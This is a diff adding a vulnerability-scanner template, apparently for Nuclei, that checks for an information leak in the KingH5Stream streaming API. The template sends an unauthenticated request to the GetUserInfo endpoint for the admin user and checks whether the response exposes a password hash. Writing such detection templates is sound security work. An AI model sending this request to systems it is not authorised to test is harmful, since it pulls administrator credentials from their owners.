@@ -1,0 +1,29 @@
+id: kingh5stream-getuserinfo-info-leak
+info:
+  name: Beijing KingH5Stream GetUserInfo Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    The KingH5Stream API allows unauthorized access to sensitive user information, including credentials.
+http:
+  - method: GET
+    path:
+      - "/api/v1/GetUserInfo?user=admin&session="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"strUser": "admin"'
+        part: body
+      - type: regex
+        regex:
+          - '"strPasswd": "[0-9a-zA-Z]{32}"'
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
